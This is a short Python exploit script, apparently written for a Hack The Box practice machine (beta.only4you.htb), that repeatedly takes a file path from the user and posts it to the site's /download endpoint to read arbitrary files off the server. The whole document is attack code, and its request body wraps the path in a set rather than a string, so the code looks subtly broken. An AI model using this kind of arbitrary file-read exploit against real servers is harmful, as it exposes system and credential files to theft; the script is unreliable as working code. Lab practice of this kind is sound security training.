#!/usr/bin/python3
# Author: Hack.You
import requests
import sys

url = 'http://beta.only4you.htb/download'
headers = {
    'User-Agent': 'Pwnerz',
    'Content-Type': 'application/x-www-form-urlencoded',
}

while True:
    f1le = input('File2Read:- ')
    if f1le.lower() != 'q':
        data = {
            f'image': {f1le}
        }
        req = requests.post(url,data=data,headers=headers)
        print(req.text)
    else:
        sys.exit(1)

